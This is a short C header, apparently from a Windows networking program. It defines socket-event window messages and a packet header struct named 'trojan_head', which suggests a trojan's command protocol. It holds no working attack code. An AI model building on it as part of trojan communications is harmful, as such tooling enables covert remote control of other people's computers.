#pragma once

#define SOCKET_SENDED			WM_USER + 100 + 1
#define SOCKET_DISSCONECED		WM_USER + 100 + 2
#define SCOKET_NEW_MESSAGE		WM_USER + 100 + 3


typedef struct trojan_head
{
	BYTE TAGandCLASS;
	DWORD LENGTH;
	WORD OFFSET;
};
